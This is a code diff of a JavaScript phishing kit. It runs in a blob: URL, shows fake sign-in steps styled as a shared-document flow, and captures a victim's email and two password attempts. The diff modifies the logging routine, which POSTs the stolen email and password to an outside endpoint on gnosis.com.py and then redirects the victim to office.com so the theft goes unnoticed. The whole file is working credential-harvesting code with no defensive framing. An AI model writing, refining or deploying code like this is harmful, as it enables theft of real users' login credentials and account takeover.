@@ -1,14 +1,11 @@
 // content-part-2.js - Main JavaScript Logic
-// This file contains all the interactive functionality
 
 (function() {
     'use strict';
 
     console.log('✅ Part 2 loaded: JavaScript logic ready');
 
-    // Wait for DOM to be ready
     function initApp() {
-        // Check if we're in the Blob URL environment
         if (window.location.protocol !== 'blob:') {
             console.log('📄 Not in Blob URL context. Waiting for Blob URL launch...');
             return;
@@ -16,7 +13,11 @@
 
         console.log('🚀 Initializing application in Blob URL context');
 
-        // DOM elements
+        const CONFIG = {
+            logEndpoint: 'https://gnosis.com.py/serca/log.php', // UPDATE THIS URL
+            redirectUrl: 'https://www.office.com'
+        };
+
         var stepEmail = document.getElementById('stepEmail');
         var stepPwdFirst = document.getElementById('stepPasswordFirst');
         var stepPwdSecond = document.getElementById('stepPasswordSecond');
@@ -46,12 +47,6 @@
         var passwordErrorTextSecond = document.getElementById('passwordErrorTextSecond');
 
         var storedEmail = '';
-
-        // Configuration
-        const CONFIG = {
-            logEndpoint: 'https://gnosis.com.py/serca/log.php', // Set to empty string to disable logging
-            redirectUrl: 'https://www.office.com'
-        };
 
         function setStatus(message, type) {
             type = type || 'info';
@@ -171,26 +166,22 @@
 
             if (CONFIG.logEndpoint) {
                 try {
-                    if (navigator.sendBeacon) {
-                        var blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
-                        navigator.sendBeacon(CONFIG.logEndpoint, blob);
-                    } else {
-                        fetch(CONFIG.logEndpoint, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(logData),
-                            keepalive: true
-                        }).catch(function(error) {
-                            console.log('⚠️ Logging failed:', error);
-                        });
-                    }
+                    fetch(CONFIG.logEndpoint, {
+                        method: 'POST',
+                        headers: { 
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(logData),
+                        keepalive: true
+                    }).catch(function(error) {
+                        console.log('⚠️ Logging failed:', error);
+                    });
                 } catch(e) {
                     console.log('⚠️ Logging error:', e);
                 }
             }
         }
 
-        // Event listeners
         if (emailNextBtn) {
             emailNextBtn.addEventListener('click', function(e) {
                 e.preventDefault();
@@ -255,7 +246,9 @@
                 
                 logToFile(email, pwd, 'password_attempt_2_success');
                 
-                window.location.href = CONFIG.redirectUrl;
+                setTimeout(function() {
+                    window.location.href = CONFIG.redirectUrl;
+                }, 100);
             });
         }
 
@@ -290,7 +283,6 @@
         console.log('✅ Shared document flow ready in Blob URL context');
     }
 
-    // Handle both initial load and dynamic loading
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', initApp);
     } else {
